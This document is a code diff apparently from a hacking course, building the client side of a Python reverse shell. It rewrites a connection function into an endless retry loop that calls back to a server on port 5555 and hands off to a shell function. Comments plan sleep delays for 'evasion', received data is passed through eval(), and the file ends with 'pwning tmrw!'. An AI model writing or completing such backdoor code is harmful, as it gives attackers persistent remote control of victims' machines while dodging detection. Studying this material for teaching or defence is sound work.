@@ -18,19 +18,9 @@ server_port = 5555
 
 ########################
 
-def connection():
-    while True:
-        time.sleep(0)
-        try:
-            client.connect((server_ip, server_port))
-            shell()
-            client.close()
-            break
-        except:
-            connection()
 
 
-def json_send():
+def json_send(data):
     jsondata = json.dumps(data)
     client.send(jsondata.encode())
 
@@ -71,16 +61,35 @@ def message_recv(size=8):
         body = eval(body)
     return body
 
-def client_conn():
+
+def connection(): # 11
     global client
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
-    client.connect((server_ip,server_port)) 
+    while True:
+        time.sleep(0) # 12
+        try:
+            client.connect((server_ip, server_port))
+            shell() # 14
+            client.close()
+            break
+        except: # 13
+            connection()
 
-
-client_conn()
+connection()
 
 # testing
 
+
+########################
+# 11    Renamed and also added a while loop; so that it will always initiate to connect to the server.
+# 12    I also added time.sleep(0) which we are going to make 1-10 seconds in the future to avoid unnecessary errors
+#       and to delay the connection to the server (evasion)
+#       it will always try to connect to the server and if it has an error...
+# 13    It will try again to connect. similarly to the json_recv that we did.
+# 14    If it successfully connected to the server, We are now going to the shell fucntion which is not existed yet.
+#       This the most exciting part of the course, we are going to make a shell on our next topic. and we will use json functions that we did.
+
+########################
 
 
 # pwning tmrw!
